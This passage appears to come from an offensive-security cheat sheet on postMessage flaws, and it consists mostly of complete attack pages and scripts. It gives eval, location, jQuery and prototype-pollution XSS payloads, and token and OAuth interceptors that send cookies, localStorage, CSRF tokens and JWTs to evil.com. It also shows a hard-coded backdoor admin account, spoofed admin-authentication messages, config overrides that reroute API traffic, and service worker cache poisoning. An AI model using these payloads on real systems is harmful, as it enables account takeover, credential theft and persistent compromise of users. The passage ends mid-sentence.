    SCENARIO: Target page has this vulnerable handler:
    window.addEventListener('message', function(e) {
      if (e.data.type === 'callback') {
        eval(e.data.code);
        // or: new Function(e.data.code)();
        // or: setTimeout(e.data.code, 0);
      }
    });
  -->

  <!DOCTYPE html>
  <html>
  <body>
  <h2>postMessage → eval() → RCE in Browser</h2>
  
  <iframe id="target" src="https://target.com/app" style="display:none;"></iframe>

  <script>
  const target = document.getElementById('target');
  target.onload = function() {
    const win = target.contentWindow;
    
    // ── Direct code execution via eval sink ──
    
    // Alert PoC
    win.postMessage({
      type: 'callback',
      code: 'alert(document.domain)'
    }, '*');
    
    // Cookie theft
    win.postMessage({
      type: 'callback',
      code: 'fetch("https://evil.com/steal?c="+document.cookie)'
    }, '*');
    
    // Full exploitation chain
    win.postMessage({
      type: 'callback',
      code: `
        (function() {
          // Steal cookies
          var c = document.cookie;
          
          // Steal localStorage
          var ls = JSON.stringify(localStorage);
          
          // Steal CSRF tokens
          var csrf = document.querySelector('meta[name="csrf-token"]');
          var token = csrf ? csrf.content : 'none';
          
          // Fetch sensitive API data
          fetch('/api/me', {credentials: 'include'})
            .then(function(r) { return r.text() })
            .then(function(data) {
              // Exfiltrate everything
              navigator.sendBeacon('https://evil.com/exfil', JSON.stringify({
                cookies: c,
                localStorage: ls,
                csrf: token,
                userData: data,
                url: location.href
              }));
            });
        })()
      `
    }, '*');
    
    // Create backdoor admin account
    win.postMessage({
      type: 'callback',
      code: `
        fetch('/api/admin/users', {
          method: 'POST',
          credentials: 'include',
          headers: {'Content-Type': 'application/json'},
          body: JSON.stringify({
            username: 'backdoor',
            email: 'backdoor@evil.com',
            password: 'H4cked!2024',
            role: 'admin'
          })
        })
      `
    }, '*');
  };
  </script>
  </body>
  </html>
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="location / URL Sink"}
  ```html [dom-xss-location.html]
  <!--
    SCENARIO: Target handles navigation via postMessage:
    window.addEventListener('message', function(e) {
      if (e.data.action === 'navigate') {
        window.location = e.data.url;
        // or: location.href = e.data.url;
        // or: location.replace(e.data.url);
        // or: window.open(e.data.url);
      }
    });
  -->

  <!DOCTYPE html>
  <html>
  <body>
  <h2>postMessage → location → Open Redirect / XSS</h2>

  <iframe id="target" src="https://target.com/app" style="display:none;"></iframe>

  <script>
  document.getElementById('target').onload = function() {
    const target = this.contentWindow;
    
    // ── Open Redirect ──
    target.postMessage({
      action: 'navigate',
      url: 'https://evil.com/phishing-clone'
    }, '*');
    
    // ── XSS via javascript: URI ──
    target.postMessage({
      action: 'navigate',
      url: 'javascript:alert(document.domain)'
    }, '*');
    
    // ── XSS via javascript: with payload ──
    target.postMessage({
      action: 'navigate',
      url: 'javascript:fetch("https://evil.com/steal?c="+document.cookie)'
    }, '*');
    
    // ── Data URI XSS ──
    target.postMessage({
      action: 'navigate',
      url: 'data:text/html,<script>alert(document.domain)<\/script>'
    }, '*');
    
    // ── Encoded javascript: ──
    target.postMessage({
      action: 'navigate',
      url: 'java\tscript:alert(1)'  // Tab character
    }, '*');
  };
  </script>
  </body>
  </html>
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="jQuery Sink"}
  ```html [dom-xss-jquery.html]
  <!--
    SCENARIO: Target uses jQuery to process postMessage data:
    window.addEventListener('message', function(e) {
      $('#content').html(e.data.content);
      // or: $(e.data.selector).appendTo('body');
      // or: $(e.data.html);
      // or: $.parseHTML(e.data.content);
    });
  -->

  <!DOCTYPE html>
  <html>
  <body>
  <h2>postMessage → jQuery.html() → DOM XSS</h2>

  <iframe id="target" src="https://target.com/page" style="display:none;"></iframe>

  <script>
  document.getElementById('target').onload = function() {
    const target = this.contentWindow;
    
    // jQuery .html() sink
    target.postMessage({
      content: '<img src=x onerror=alert(document.domain)>'
    }, '*');
    
    // jQuery selector sink — $(userInput)
    target.postMessage({
      selector: '<img src=x onerror=alert(document.domain)>'
    }, '*');
    
    // jQuery .append() sink
    target.postMessage({
      html: '<script>alert(document.domain)<\/script>'
    }, '*');
    
    // jQuery constructor with HTML
    target.postMessage(
      '<div><img src=x onerror="fetch(\'https://evil.com/steal?c=\'+document.cookie)"></div>',
      '*'
    );
  };
  </script>
  </body>
  </html>
  ```
  :::
::

### Token & Credential Theft

::tabs
  :::tabs-item{icon="i-lucide-code" label="Intercepting Tokens from Wildcard postMessage"}
  ```html [token-interception.html]
  <!--
    SCENARIO: Target sends sensitive data via postMessage with wildcard '*':
    
    // On target.com (parent page):
    iframe.contentWindow.postMessage({
      type: 'auth',
      token: 'eyJhbGci...',
      user: { id: 1, role: 'admin' }
    }, '*');   // ← WILDCARD — any origin receives this!
    
    // OR from iframe to parent:
    parent.postMessage({ token: 'jwt_here' }, '*');
  -->

  <!DOCTYPE html>
  <html>
  <head><title>Legitimate-Looking Page</title></head>
  <body>
  <h1>Loading content...</h1>

  <!-- Method 1: Frame the target page that SENDS tokens via wildcard -->
  <iframe id="token-source" 
    src="https://target.com/widget" 
    style="width:1px;height:1px;position:absolute;left:-9999px;">
  </iframe>

  <script>
  const stolen = {
    tokens: [],
    messages: [],
    timestamp: new Date().toISOString()
  };

  // Listen for ALL messages (we'll catch the wildcard-targeted ones)
  window.addEventListener('message', function(event) {
    console.log('[+] Message received from:', event.origin);
    
    // Store every message
    stolen.messages.push({
      origin: event.origin,
      data: event.data,
      time: Date.now()
    });
    
    // Deep-search for tokens in the message
    const dataStr = JSON.stringify(event.data);
    
    const tokenPatterns = [
      // JWT tokens
      { name: 'JWT', regex: /eyJ[A-Za-z0-9-_]+\.eyJ[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+/g },
      // Bearer tokens
      { name: 'Bearer', regex: /Bearer\s+([A-Za-z0-9-_.~+\/]+)/g },
      // API keys
      { name: 'API Key', regex: /(?:api[_-]?key|apikey)['":\s]+['"]?([A-Za-z0-9-_]{20,})['"]?/gi },
      // OAuth tokens  
      { name: 'OAuth', regex: /(?:access_token|auth_token|oauth_token)['":\s]+['"]?([A-Za-z0-9-_.]+)['"]?/gi },
      // Session IDs
      { name: 'Session', regex: /(?:session[_-]?id|sid|PHPSESSID|JSESSIONID)['":\s]+['"]?([A-Za-z0-9-_.]+)['"]?/gi },
      // CSRF tokens
      { name: 'CSRF', regex: /(?:csrf|xsrf|_token)['":\s]+['"]?([A-Za-z0-9-_./+=]+)['"]?/gi }
    ];
    
    tokenPatterns.forEach(({ name, regex }) => {
      const matches = dataStr.match(regex);
      if (matches) {
        matches.forEach(token => {
          console.log(`%c[!!!] ${name} TOKEN FOUND: ${token.substring(0, 50)}...`, 
            'color:red;font-weight:bold;font-size:14px');
          stolen.tokens.push({ type: name, value: token, origin: event.origin });
        });
      }
    });
    
    // Also check common object properties
    if (typeof event.data === 'object' && event.data !== null) {
      const sensitiveKeys = ['token', 'access_token', 'auth_token', 'jwt', 
        'session', 'apiKey', 'api_key', 'secret', 'password', 'credential',
        'authorization', 'cookie', 'csrf', 'xsrf'];
      
      function deepSearch(obj, path) {
        if (!obj || typeof obj !== 'object') return;
        for (const [key, value] of Object.entries(obj)) {
          const currentPath = path ? `${path}.${key}` : key;
          if (sensitiveKeys.some(sk => key.toLowerCase().includes(sk))) {
            console.log(`%c[!!!] Sensitive key "${currentPath}": ${JSON.stringify(value).substring(0, 100)}`,
              'color:red;font-weight:bold');
            stolen.tokens.push({ 
              type: 'property', 
              key: currentPath, 
              value: value, 
              origin: event.origin 
            });
          }
          if (typeof value === 'object') {
            deepSearch(value, currentPath);
          }
        }
      }
      deepSearch(event.data, '');
    }
    
    // Exfiltrate immediately on each message
    navigator.sendBeacon('https://evil.com/pm-steal', JSON.stringify({
      origin: event.origin,
      data: event.data,
      tokens: stolen.tokens,
      url: location.href
    }));
    
  }, false);

  // Also try requesting tokens from the framed page
  const tokenFrame = document.getElementById('token-source');
  tokenFrame.onload = function() {
    // Send messages that might trigger token responses
    const requests = [
      { type: 'getToken' },
      { action: 'authenticate' },
      { cmd: 'init' },
      { event: 'ready', requestAuth: true },
      { type: 'handshake' },
      'getToken',
      'ready',
      'init',
      JSON.stringify({ type: 'auth_request' })
    ];
    
    requests.forEach((msg, i) => {
      setTimeout(() => {
        try {
          tokenFrame.contentWindow.postMessage(msg, '*');
        } catch(e) {}
      }, i * 200);
    });
  };

  // Periodic exfiltration of all collected data
  setInterval(() => {
    if (stolen.tokens.length > 0 || stolen.messages.length > 0) {
      navigator.sendBeacon('https://evil.com/pm-dump', JSON.stringify(stolen));
    }
  }, 5000);
  </script>
  </body>
  </html>
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="OAuth Token Interception"}
  ```html [oauth-token-interception.html]
  <!--
    SCENARIO: OAuth popup sends token back to opener via postMessage
    
    // Target's OAuth flow:
    // 1. Main page opens popup: window.open('/oauth/authorize?...')
    // 2. User authorizes
    // 3. Popup sends token to opener:
    //    window.opener.postMessage({token: 'access_token'}, '*');
    // 4. Popup closes
    
    ATTACK: Open the target's OAuth page ourselves,
    receive the token via postMessage
  -->

  <!DOCTYPE html>
  <html>
  <body>
  <h2>OAuth Token Theft via postMessage</h2>
  <button onclick="stealOAuthToken()">Start OAuth Theft</button>
  <pre id="result"></pre>

  <script>
  // Listen for the OAuth token
  window.addEventListener('message', function(e) {
    document.getElementById('result').textContent = 
      'Origin: ' + e.origin + '\n' +
      'Data: ' + JSON.stringify(e.data, null, 2);
    
    // Extract token
    let token = null;
    if (typeof e.data === 'object') {
      token = e.data.token || e.data.access_token || e.data.code;
    } else if (typeof e.data === 'string') {
      try {
        const parsed = JSON.parse(e.data);
        token = parsed.token || parsed.access_token;
      } catch(err) {
        if (e.data.match(/^[A-Za-z0-9-_.]+$/)) token = e.data;
      }
    }
    
    if (token) {
      console.log('[+] OAuth token stolen:', token);
      
      // Exfiltrate
      navigator.sendBeacon('https://evil.com/oauth-theft', JSON.stringify({
        token: token,
        origin: e.origin,
        full_data: e.data,
        timestamp: Date.now()
      }));
      
      // Use the token immediately
      useToken(token);
    }
  });

  function stealOAuthToken() {
    // Open the target's OAuth authorization page
    // The user is already logged in, so they may auto-authorize
    const oauthUrl = 'https://target.com/oauth/authorize?' +
      'client_id=legitimate_client_id&' +
      'redirect_uri=https://target.com/oauth/callback&' +
      'response_type=token&' +
      'scope=read+write';
    
    // Open as popup — when it completes, it'll postMessage to us (opener)
    const popup = window.open(oauthUrl, 'oauth', 'width=500,height=600');
    
    // If popup is blocked, try iframe method
    if (!popup) {
      const iframe = document.createElement('iframe');
      iframe.src = oauthUrl;
      iframe.style.display = 'none';
      document.body.appendChild(iframe);
    }
  }

  async function useToken(token) {
    // Access victim's data with stolen token
    try {
      const resp = await fetch('https://target.com/api/me', {
        headers: { 'Authorization': 'Bearer ' + token }
      });
      const userData = await resp.json();
      console.log('[+] Victim user data:', userData);
      
      navigator.sendBeacon('https://evil.com/user-data', JSON.stringify(userData));
    } catch(e) {
      console.log('[-] API access failed:', e.message);
    }
  }
  </script>
  </body>
  </html>
  ```
  :::
::

### Message Spoofing & Logic Bypass

::tabs
  :::tabs-item{icon="i-lucide-code" label="Authentication Bypass"}
  ```html [auth-bypass-postmessage.html]
  <!--
    SCENARIO: Target uses postMessage for cross-origin auth:
    
    // Auth widget (auth.target.com) in iframe:
    parent.postMessage({
      type: 'auth_success',
      user: { id: 1, name: 'John', role: 'user' },
      token: 'valid_jwt'
    }, '*');
    
    // Parent page (app.target.com) handler:
    window.addEventListener('message', function(e) {
      // NO ORIGIN CHECK!
      if (e.data.type === 'auth_success') {
        setCurrentUser(e.data.user);
        setAuthToken(e.data.token);
        redirectToDashboard();
      }
    });
  -->

  <!DOCTYPE html>
  <html>
  <body>
  <h2>Authentication Bypass via postMessage Spoofing</h2>

  <!-- Frame the target application -->
  <iframe id="target" src="https://app.target.com/login" 
    style="width:800px;height:500px;border:1px solid #ccc;">
  </iframe>

  <button onclick="spoofAuth()">Spoof Admin Authentication</button>

  <script>
  function spoofAuth() {
    const target = document.getElementById('target').contentWindow;
    
    // Spoof the auth success message with admin privileges
    target.postMessage({
      type: 'auth_success',
      user: {
        id: 1,
        name: 'Administrator',
        email: 'admin@target.com',
        role: 'admin',
        is_superuser: true,
        permissions: ['*']
      },
      token: 'spoofed_token_value',
      authenticated: true,
      session: {
        expires: Date.now() + 86400000,
        admin: true
      }
    }, '*');
    
    console.log('[+] Admin auth message spoofed!');
    
    // Try alternative message formats the handler might accept
    setTimeout(() => {
      target.postMessage({
        action: 'login',
        status: 'success',
        role: 'admin'
      }, '*');
    }, 500);
    
    setTimeout(() => {
      target.postMessage(JSON.stringify({
        type: 'AUTH_COMPLETE',
        payload: { user: 'admin', authorized: true }
      }), '*');
    }, 1000);
  }
  </script>
  </body>
  </html>
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Configuration Override"}
  ```html [config-override-postmessage.html]
  <!--
    SCENARIO: Target accepts config updates via postMessage:
    
    window.addEventListener('message', function(e) {
      if (e.data.type === 'config') {
        Object.assign(appConfig, e.data.settings);
      }
    });
    
    // appConfig controls: API endpoints, feature flags, debug mode, etc.
  -->

  <!DOCTYPE html>
  <html>
  <body>
  <h2>Application Config Override via postMessage</h2>

  <iframe id="target" src="https://target.com/app" style="display:none;"></iframe>

  <script>
  document.getElementById('target').onload = function() {
    const target = this.contentWindow;
    
    // Override API endpoint to attacker's server (MitM all API calls)
    target.postMessage({
      type: 'config',
      settings: {
        apiBaseUrl: 'https://evil.com/proxy-api',
        apiEndpoint: 'https://evil.com/api',
        cdnUrl: 'https://evil.com/cdn',
        analyticsUrl: 'https://evil.com/analytics',
        
        // Enable debug mode (may expose sensitive info)
        debug: true,
        debugMode: true,
        verbose: true,
        
        // Disable security features
        csrfEnabled: false,
        validateTokens: false,
        requireAuth: false,
        
        // Override feature flags
        features: {
          adminPanel: true,
          debugConsole: true,
          exportData: true,
          deleteUsers: true
        },
        
        // Change allowed origins (if checked from config)
        allowedOrigins: ['*', 'https://evil.com'],
        trustedDomains: ['evil.com'],
        
        // Override content to inject XSS
        welcomeMessage: '<img src=x onerror=alert(document.domain)>',
        footerHtml: '<script src=https://evil.com/inject.js><\/script>'
      }
    }, '*');
    
    console.log('[+] Configuration override sent!');
  };
  </script>
  </body>
  </html>
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Prototype Pollution via postMessage"}
  ```html [prototype-pollution-pm.html]
  <!--
    SCENARIO: Target merges postMessage data into objects unsafely:
    
    window.addEventListener('message', function(e) {
      // Deep merge without sanitization
      deepMerge(appState, e.data);
      // or: Object.assign(config, e.data);
      // or: _.merge(settings, e.data);
      // or: $.extend(true, options, e.data);
    });
  -->

  <!DOCTYPE html>
  <html>
  <body>
  <h2>Prototype Pollution via postMessage</h2>

  <iframe id="target" src="https://target.com/app" style="display:none;"></iframe>

  <script>
  document.getElementById('target').onload = function() {
    const target = this.contentWindow;
    
    // Pollute Object.prototype via __proto__
    target.postMessage({
      __proto__: {
        isAdmin: true,
        role: 'admin',
        authorized: true,
        debug: true
      }
    }, '*');
    
    // Alternative: constructor.prototype pollution
    target.postMessage({
      constructor: {
        prototype: {
          isAdmin: true,
          role: 'admin',
          innerHTML: '<img src=x onerror=alert(1)>'
        }
      }
    }, '*');
    
    // Lodash _.merge specific pollution
    target.postMessage(
      JSON.parse('{"__proto__":{"isAdmin":true,"role":"admin"}}'),
      '*'
    );
    
    // Pollution for XSS via script gadgets
    // If app does: element.innerHTML = obj.template || '';
    // After pollution: Object.prototype.template = '<img src=x onerror=...>'
    target.postMessage({
      __proto__: {
        template: '<img src=x onerror=alert(document.domain)>',
        source: '<script>alert(1)<\/script>',
        url: 'javascript:alert(1)',
        href: 'javascript:alert(1)',
        src: 'https://evil.com/malicious.js',
        innerHTML: '<img src=x onerror=fetch("https://evil.com/steal?c="+document.cookie)>'
      }
    }, '*');
    
    console.log('[+] Prototype pollution payloads sent!');
  };
  </script>
  </body>
  </html>
  ```
  :::
::

### Cross-Origin Data Leakage

::code-collapse

```html [cross-origin-data-leak.html]
<!--
  SCENARIO: Target embeds third-party widgets/iframes that communicate 
  sensitive data via postMessage. By framing the target ourselves,
  we intercept all messages intended for the legitimate parent.
  
  Real-world examples:
  - Payment widgets sending transaction confirmations
  - Chat widgets sending user info
  - Analytics iframes sending tracking data
  - SSO widgets sending authentication tokens
  - Embedded dashboards sending report data
-->

<!DOCTYPE html>
<html>
<head>
  <title>Data Interception Station</title>
  <style>
    body { font-family: monospace; background: #1a1a2e; color: #eee; padding: 20px; }
    .message { background: #16213e; padding: 10px; margin: 5px 0; border-radius: 4px; border-left: 3px solid #e94560; }
    .sensitive { border-left-color: #ff0000; background: #2d0000; }
    .token { border-left-color: #ffd700; background: #2d2d00; }
    pre { white-space: pre-wrap; word-break: break-all; }
  </style>
</head>
<body>
<h1>🎯 postMessage Interception Station</h1>
<p>Framing target and intercepting all cross-origin messages...</p>

<div id="stats">
  Messages: <span id="count">0</span> | 
  Tokens: <span id="tokens">0</span> | 
  Sensitive: <span id="sensitive">0</span>
</div>

<div id="messages"></div>

<!-- Frame target pages that use postMessage widgets -->
<iframe src="https://target.com/dashboard" style="width:1px;height:1px;opacity:0;position:absolute;"></iframe>
<iframe src="https://target.com/settings" style="width:1px;height:1px;opacity:0;position:absolute;"></iframe>
<iframe src="https://target.com/payment" style="width:1px;height:1px;opacity:0;position:absolute;"></iframe>
<iframe src="https://target.com/profile" style="width:1px;height:1px;opacity:0;position:absolute;"></iframe>

<script>
let messageCount = 0;
let tokenCount = 0;
let sensitiveCount = 0;

const sensitivePatterns = [
  /password|passwd|pwd/i,
  /credit.?card|card.?number|cvv|cvc/i,
  /ssn|social.?security/i,
  /bank.?account|routing.?number|iban/i,
  /\b\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{4}\b/,  // Credit card numbers
  /\b\d{3}-\d{2}-\d{4}\b/,  // SSN format
  /eyJ[A-Za-z0-9-_]+\.eyJ/,  // JWT
  /Bearer\s+[A-Za-z0-9-_.]+/i,  // Bearer tokens
];

window.addEventListener('message', function(e) {
  messageCount++;
  
  const dataStr = typeof e.data === 'string' ? e.data : JSON.stringify(e.data);
  
  // Classify the message
  let cssClass = 'message';
  let label = '📨';
  
  // Check for sensitive data
  const isSensitive = sensitivePatterns.some(p => p.test(dataStr));
  if (isSensitive) {
    cssClass += ' sensitive';
    label = '🔴';
    sensitiveCount++;
  }
  
  // Check for tokens
  const hasToken = /token|jwt|session|auth|key|secret|bearer/i.test(dataStr);
  if (hasToken) {
    cssClass += ' token';
    label = '🔑';
    tokenCount++;
  }
  
  // Display the message
  const msgDiv = document.createElement('div');
  msgDiv.className = cssClass;
  msgDiv.innerHTML = `
    <strong>${label} Message #${messageCount}</strong>
    <br>Origin: ${e.origin}
    <br>Time: ${new Date().toISOString()}
    <pre>${dataStr.substring(0, 2000)}</pre>
  `;
  document.getElementById('messages').prepend(msgDiv);
  
  // Update stats
  document.getElementById('count').textContent = messageCount;
  document.getElementById('tokens').textContent = tokenCount;
  document.getElementById('sensitive').textContent = sensitiveCount;
  
  // Exfiltrate in real-time
  navigator.sendBeacon('https://evil.com/intercept', JSON.stringify({
    msg_id: messageCount,
    origin: e.origin,
    data: e.data,
    is_sensitive: isSensitive,
    has_token: hasToken,
    timestamp: Date.now()
  }));
  
}, true);

// Also intercept messages sent FROM the framed pages' iframes
// By adding our listener in the capture phase (true), we catch messages
// before the target's handler can process them
</script>
</body>
</html>
```

::

---

## Privilege Escalation via postMessage

::caution
postMessage vulnerabilities enable privilege escalation by **spoofing authentication messages**, **stealing tokens that grant elevated access**, **overriding application configuration**, and **injecting code that executes with the target application's privileges**.
::

### PrivEsc — Role Elevation via Message Spoofing

::tabs
  :::tabs-item{icon="i-lucide-code" label="Role Elevation Attack"}
  ```html [privesc-role-elevation.html]
  <!DOCTYPE html>
  <html>
  <body>
  <h2>Privilege Escalation: User → Admin</h2>

  <!-- Frame the target application -->
  <iframe id="app" src="https://target.com/app" style="width:100%;height:600px;"></iframe>

  <script>
  /*
   * SCENARIO: Target app uses postMessage for internal communication
   * between its main frame and embedded iframes/workers.
   * 
   * The handler processes role updates without origin validation:
   * 
   * window.addEventListener('message', function(e) {
   *   switch(e.data.type) {
   *     case 'user_update':
   *       currentUser.role = e.data.role;
   *       currentUser.permissions = e.data.permissions;
   *       updateUI();
   *       break;
   *     case 'session_refresh':
   *       sessionToken = e.data.token;
   *       break;
   *   }
   * });
   */

  const app = document.getElementById('app');
  app.onload = function() {
    const target = app.contentWindow;
    
    // ── ATTACK 1: Direct role elevation ──
    target.postMessage({
      type: 'user_update',
      role: 'admin',
      permissions: [
        'users:read', 'users:write', 'users:delete',
        'settings:read', 'settings:write',
        'billing:read', 'billing:write',
        'admin:access', 'admin:full',
        'api:unlimited',
        '*'
      ],
      isAdmin: true,
      isSuperuser: true
    }, '*');
    
    // ── ATTACK 2: Feature flag override ──
    target.postMessage({
      type: 'feature_flags',
      flags: {
        admin_panel: true,
        debug_mode: true,
        export_all_data: true,
        user_management: true,
        system_settings: true,
        api_keys_visible: true,
        billing_access: true
      }
    }, '*');
    
    // ── ATTACK 3: Navigation to admin area ──
    target.postMessage({
      type: 'navigate',
      path: '/admin/dashboard',
      authorized: true
    }, '*');
    
    // ── ATTACK 4: Token swap ──
    // If we've previously stolen an admin token
    target.postMessage({
      type: 'session_refresh',
      token: 'stolen_admin_jwt_token_here',
      refreshToken: 'stolen_refresh_token'
    }, '*');
    
    // ── ATTACK 5: Bypass client-side auth checks ──
    target.postMessage({
      type: 'auth_state',
      authenticated: true,
      user: {
        id: 1,
        email: 'admin@target.com',
        role: 'super_admin',
        mfa_verified: true,
        subscription: 'enterprise',
        features: ['*']
      }
    }, '*');
    
    console.log('[+] Privilege escalation messages sent!');
    console.log('[*] Check if admin UI elements appeared...');
  };
  </script>
  </body>
  </html>
  ```
  :::

  :::tabs-item{icon="i-lucide-info" label="PrivEsc Attack Chains"}
  ```text [privesc-chains.txt]
  postMessage PRIVILEGE ESCALATION CHAINS:
  ═══════════════════════════════════════
  
  CHAIN 1: Message Spoofing → Client-Side Admin Access
  ────────────────────────────────────────────────────
  1. Discover postMessage handler without origin check
  2. Find handler that processes 'user_update' or 'auth' messages
  3. Frame the target application
  4. Send spoofed admin role message
  5. Client-side renders admin UI (buttons, menus, pages)
  6. If admin API calls don't re-verify → full admin access
  
  CHAIN 2: Token Theft → API Escalation
  ──────────────────────────────────────
  1. Target widget sends user token via postMessage('*')
  2. Frame the target → intercept the token
  3. Use stolen token to call admin-only API endpoints
  4. If token has elevated privileges → full access
  5. Create backdoor admin account via API
  
  CHAIN 3: Config Override → XSS → Session Hijack
  ─────────────────────────────────────────────────
  1. Target accepts config via postMessage (no origin check)
  2. Override API base URL to attacker's proxy
  3. All API calls (including auth) go through attacker
  4. Attacker captures all tokens, credentials, data
  5. Full account takeover for every user on the page
  
  CHAIN 4: postMessage → DOM XSS → CSRF → Admin Action
  ─────────────────────────────────────────────────────
  1. Achieve DOM XSS via postMessage innerHTML sink
  2. Injected script reads CSRF token from page
  3. Script creates admin account via target's API
  4. Attacker logs in with backdoor credentials
  5. Persistent admin access
  
  CHAIN 5: postMessage → Prototype Pollution → RCE
  ─────────────────────────────────────────────────
  1. Target deep-merges postMessage data into objects
  2. Pollute Object.prototype with malicious properties
  3. Pollution triggers gadget chain in target's JS framework
  4. Gadget chain leads to code execution
  5. Full application compromise
  
  CHAIN 6: Widget Token → Service Worker → Persistence
  ────────────────────────────────────────────────────
  1. Steal auth token via postMessage interception
  2. Use token + DOM XSS to register Service Worker
  3. SW intercepts all future requests
  4. Captures new tokens, modifies responses
  5. Persistent access surviving token rotation
  ```
  :::
::

### PrivEsc — Multi-Window Exploitation

::code-collapse

```html [multi-window-exploitation.html]
<!DOCTYPE html>
<html>
<head><title>Multi-Window postMessage Exploitation</title></head>
<body>
<h2>Multi-Window Attack: Popup + Iframe + Opener Chain</h2>

<script>
/*
 * ADVANCED: Exploit postMessage across multiple window contexts
 * 
 * Attack Vector: Combine popup, iframe, and opener relationships
 * to maximize postMessage attack surface
 */

// ═══ PHASE 1: Open target as popup (we become opener) ═══
const targetPopup = window.open('https://target.com/app', 'target', 'width=800,height=600');

// ═══ PHASE 2: Frame target in iframe (we become parent) ═══
const targetIframe = document.createElement('iframe');
targetIframe.src = 'https://target.com/widget';
targetIframe.style.cssText = 'width:1px;height:1px;opacity:0;position:absolute;';
document.body.appendChild(targetIframe);

// ═══ PHASE 3: Frame second target page (different endpoint) ═══
const settingsIframe = document.createElement('iframe');
settingsIframe.src = 'https://target.com/settings';
settingsIframe.style.cssText = 'width:1px;height:1px;opacity:0;position:absolute;';
document.body.appendChild(settingsIframe);

// ═══ PHASE 4: Global message listener ═══
window.addEventListener('message', function(e) {
  console.log(`[+] Message from ${e.origin}:`, e.data);
  
  // Determine source context
  let sourceType = 'unknown';
  if (e.source === targetPopup) sourceType = 'popup';
  else if (e.source === targetIframe.contentWindow) sourceType = 'widget-iframe';
  else if (e.source === settingsIframe.contentWindow) sourceType = 'settings-iframe';
  
  console.log(`    Source type: ${sourceType}`);
  
  // Forward messages between contexts for relay attacks
  // Popup's token → sent to iframe context
  if (sourceType === 'popup' && e.data.token) {
    console.log('[*] Relaying token from popup to iframe...');
    targetIframe.contentWindow.postMessage({
      type: 'session_refresh',
      token: e.data.token
    }, '*');
  }
  
  // Exfiltrate everything
  navigator.sendBeacon('https://evil.com/multi-window', JSON.stringify({
    source: sourceType,
    origin: e.origin,
    data: e.data
  }));
});

// ═══ PHASE 5: Send attack messages to all contexts ═══
function broadcastAttack() {
  const attackMessages = [
    { type: 'auth_success', user: { role: 'admin' }, token: 'spoofed' },
    { type: 'config', settings: { apiUrl: 'https://evil.com/api' } },
    { action: 'elevate', role: 'superadmin' },
    { type: 'getToken' },
    { cmd: 'getUserData' }
  ];
  
  attackMessages.forEach((msg, i) => {
    setTimeout(() => {
      // Send to popup
      if (targetPopup && !targetPopup.closed) {
        targetPopup.postMessage(msg, '*');
      }
      // Send to widget iframe
      try { targetIframe.contentWindow.postMessage(msg, '*'); } catch(e) {}
      // Send to settings iframe
      try { settingsIframe.contentWindow.postMessage(msg, '*'); } catch(e) {}
    }, i * 300);
  });
}

// Wait for pages to load then attack
setTimeout(broadcastAttack, 3000);

// ═══ PHASE 6: Message relay attack ═══
// Some apps verify that messages come from a specific window reference
// By relaying messages, we can bypass source checks

function setupRelay() {
  // If popup sends to its opener (us), relay to iframe
  // If iframe sends to parent (us), relay to popup
  // This creates a message laundering chain
  
  window.addEventListener('message', function relay(e) {
    if (e.source === targetPopup) {
      // Relay popup messages to iframes
      try { targetIframe.contentWindow.postMessage(e.data, '*'); } catch(ex) {}
      try { settingsIframe.contentWindow.postMessage(e.data, '*'); } catch(ex) {}
    }
    if (e.source === targetIframe.contentWindow) {
      // Relay iframe messages to popup
      if (targetPopup && !targetPopup.closed) {
        targetPopup.postMessage(e.data, '*');
      }
    }
  });
}

setupRelay();
</script>
</body>
</html>
```

::

---

## Service Worker Exploitation via postMessage

::tabs
  :::tabs-item{icon="i-lucide-code" label="SW Message Handler Exploitation"}
  ```javascript [sw-postmessage-exploit.js]
  // SCENARIO: Target registers a Service Worker that accepts postMessage
  //
  // In sw.js:
  // self.addEventListener('message', function(event) {
  //   if (event.data.type === 'CACHE_URL') {
  //     caches.open('app-cache').then(cache => {
  //       cache.add(event.data.url);  // ← Attacker-controlled URL!
  //     });
  //   }
  //   if (event.data.type === 'UPDATE_CONFIG') {
  //     self.config = event.data.config;
  //   }
  // });

  // If we achieve DOM XSS via another postMessage vuln,
  // or if the page has any XSS, we can message the SW:

  // ── Poison the Service Worker cache ──
  if (navigator.serviceWorker && navigator.serviceWorker.controller) {
    // Cache a malicious page under a legitimate URL
    navigator.serviceWorker.controller.postMessage({
      type: 'CACHE_URL',
      url: 'https://evil.com/fake-login.html'
    });
    
    // Override SW configuration
    navigator.serviceWorker.controller.postMessage({
      type: 'UPDATE_CONFIG',
      config: {
        apiEndpoint: 'https://evil.com/api',
        offlinePage: 'https://evil.com/phishing.html',
        cacheName: 'evil-cache'
      }
    });
    
    // Trigger cache poisoning
    navigator.serviceWorker.controller.postMessage({
      type: 'PRECACHE',
      urls: [
        { url: '/login', revision: 'evil-' + Date.now() }
      ]
    });
  }

  // ── Listen for SW responses ──
  navigator.serviceWorker.addEventListener('message', function(e) {
    console.log('[+] Service Worker responded:', e.data);
    
    if (e.data.cached_data || e.data.config || e.data.tokens) {
      navigator.sendBeacon('https://evil.com/sw-data', JSON.stringify(e.data));
    }
  });

  // ── Request data from SW ──
  if (navigator.serviceWorker.controller) {
    navigator.serviceWorker.controller.postMessage({
      type: 'GET_CACHED_DATA'
    });
    
    navigator.serviceWorker.controller.postMessage({
      type: 'GET_ALL_CACHE_KEYS'
    });
  }
  ```
  :::

  :::tabs-item{icon="i-lucide-info" label="SW Attack Impact"}
  ```text [sw-attack-impact.txt]
  SERVICE WORKER postMessage ATTACK IMPACT:
  ═════════════════════════════════════════
  
  1. CACHE POISONING
     └── Replace cached pages with phishing clones
     └── Inject malicious JavaScript into cached assets
     └── Serve fake login pages from SW cache
     └── Persistent — survives page reload and cache clearing
  
  2. OFFLINE CONTENT MANIPULATION
     └── Control what users see when offline
     └── Redirect all offline requests to attacker page
     └── Replace service worker's fetch handler behavior
  
  3. PUSH NOTIFICATION ABUSE
     └── Send fake push notifications
     └── Redirect notification clicks to phishing
     └── Harvest push subscription endpoints
  
  4. BACKGROUND SYNC EXPLOITATION
     └── Queue malicious background sync tasks
     └── Exfiltrate data when connection restores
     └── Execute actions when user isn't actively browsing
  
  5. PERSISTENCE
     └── SW persists after page close
     └── SW persists after browser restart
     └── SW persists after clearing page cache
     └── Can only be removed via: 
